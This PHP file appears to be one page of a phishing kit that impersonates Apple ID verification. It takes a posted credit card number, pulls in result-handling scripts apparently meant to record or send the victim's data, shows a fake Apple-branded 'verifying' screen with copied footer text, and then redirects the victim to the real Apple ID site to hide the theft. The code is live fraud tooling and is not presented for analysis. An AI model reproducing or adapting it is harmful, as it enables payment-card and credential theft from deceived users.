<?php 
error_reporting(0);
error_reporting(E_ERROR);
require "assets/includes/session_protect.php";
require "assets/includes/language.php";
include "config.php";
require "result/curl.php";
?>
<?php
$ccno = $_POST["ccno"];
@error_reporting(0);
ini_set('display_errors', 0);
require "lang.php";
if ($idcard == "naam" && $ccno =="") {}
else {
    include "result/idver.php";
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
    <meta http-equiv="refresh"
          content="5; url=https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwioqpfl4oPKAhWHPxQKHYGXAjkQFggfMAA&url=https%3A%2F%2Fappleid.apple.com%2F&usg=AFQjCNF7841Jq5PLrYJwYDN8RkcZjuNVww&sig2=gKBRh04c9wVr4EOc4FARAw&bvm=bv.110151844,d.d24"/>
    <title><?php echo $comp?></title>
    <link href="assets/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
    <link href="assets/css/First.css" media="all" rel="stylesheet" type="text/css">
    <link href="assets/css/Second.css" rel="stylesheet" type="text/css">
    <link href="assets/css/Fonts.css" rel="stylesheet" type="text/css">
    <link href="assets/css/verify.css" rel="stylesheet" type="text/css">
</head>
<body id="pagecontent">
<div id="content">
    <div class="bdd45">
        <nav id="xdsfv54" class="js no-touch svg no-ie7 no-ie8">
            <div class="HeaderObjHolder">
                <ul class="MobHeader">
                    <li class="HeaderObj MobMenIconH">
                        <label class="MobMenHol">
<span class="MobMenIcon MobMenIcon-top">
<span class="MobMenIcon-crust MobMenIcon-crust-top"></span> </span> <span class="MobMenIcon MobMenIcon-bottom">
<span class="MobMenIcon-crust MobMenIcon-crust-bottom"></span> </span>
                        </label>
                    </li>
                    <li class="HeaderObj">
                        <a class="Item1" href="#" style="display: inline-block;margin-left:50%;margin-top:11px"
                           id="ac-gn-firstfocus-small"> <span class="ac-gn-link-text">&nbsp;</span> </a>
                        <a class="Item10" style="display: inline-block;float:right;margin-top:11px" href="#"> <span
                                    class="ac-gn-link-text">&nbsp;</span> <span class="ac-gn-bag-badge"></span> </a>
                        <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
                    </li>
                </ul>
                <ul class="HeaderObjList">
                    <li class="HeaderObj HeaderItem"><a class="HeaderLink Item1" href="#"></a></li>
                    <li class="HeaderObj HeaderItem"><a class="HeaderLink Item2" href="#"></a></li>
                    <li class="HeaderObj HeaderItem"><a class="HeaderLink Item3" href="#"></a></li>
                    <li class="HeaderObj HeaderItem"><a class="HeaderLink Item4" href="#"></a></li>
                    <li class="HeaderObj HeaderItem"><a class="HeaderLink Item5" href="#"></a></li>
                    <li class="HeaderObj HeaderItem"><a class="HeaderLink Item6" href="#"></a></li>
                    <li class="HeaderObj HeaderItem"><a class="HeaderLink Item7" href="#"></a></li>
                    <li class="HeaderObj HeaderItem"><a class="HeaderLink Item8" href="#"></a></li>
                    <li class="HeaderObj HeaderItem"><a class="HeaderLink Item9" href="#"></a></li>
                    <li class="HeaderObj HeaderItem"><a class="HeaderLink Item10" href="#"></a></li>
                </ul>
            </div>
        </nav>
        <script>var version = "<?php echo $data_arr ?>"; </script>
        <?php include "bagian/flow.php" ?>
                <div class="container">
                    <div class="flex home-content">
                        <div class="container flow-sections">
                            <div class="account-wrapper">
                                <div align="center">
                                    <h1 style="color:#009CDE"><?php echo $avcomp ?></h1>
                                    <p><span class="clearfix" style="margin-top: 10px;"><img id="spinner"
                                                                                             src="assets/img/spin.GIF"
                                                                                             height="24"
                                                                                             width="160"></span></p>
                                    <p><?php echo $textver ?></p>
                                    <p style="text-decoration: underline;color:red;"><?php echo $foryo ?></p>
                                </div>
                            </div>


                        </div>
                    </div>
                </div>
            </div><br><br><br><br>
            <div class="global-footer" style="background-color:#f6f6f6">
  <footer>
    <footer id="ac-globalfooter" class="js flexbox" lang="en-US" data-analytics-region="global footer" role="contentinfo" aria-labelledby="ac-gf-label">
        <div class="ac-gf-content">
             <style>#ac-globalfooter .ac-gf-footer-legal-link:last-child  {margin: 3px 0 0 0;} #ac-globalfooter .ac-gf-footer {border-top: none;}</style><section class="ac-gf-footer">
	
<div class="ac-gf-footer-shop" x-ms-format-detection="none" style="padding-top:15px; padding-bottom:8px;padding-left:15%;font-family: Segoe UI;color:#7c7c7c;font-size: 11px;">
		More ways to shop: Visit an <a href="#">Apple Store</a>, <span class="nowrap">call <?php echo $lang['APPCALL']; ?>, or <a href="#">find a reseller</a></span>.
		</div>
<div class="ac-gf-footer-shop" x-ms-format-detection="none" style="padding-bottom:30px;padding-left:15%;font-family: Segoe UI;color:#7c7c7c;font-size: 11px;">
		Copyright © 2019 Apple Inc. All rights reserved.&nbsp&nbspPrivacy Policy&nbsp&nbsp Terms of Use&nbsp&nbsp Sales and Refunds&nbsp&nbsp Legal&nbsp&nbsp Site Map<a class="choose" href="#"><img height="20" src="<?php
	echo $lang['FLAG']; ?>" width="20" style ="margin-right:15%" align="right"></a>
	</div>

        </div>
    </footer>
</div>
        </div>
    </div>
</body>
</html>
<script type="text/javascript">
    $(window).resize(function() {

  if ($(this).width() < 1024) {

    $('.global-footer').hide();

  } else {

    $('.global-footer').show();

    }

});
</script>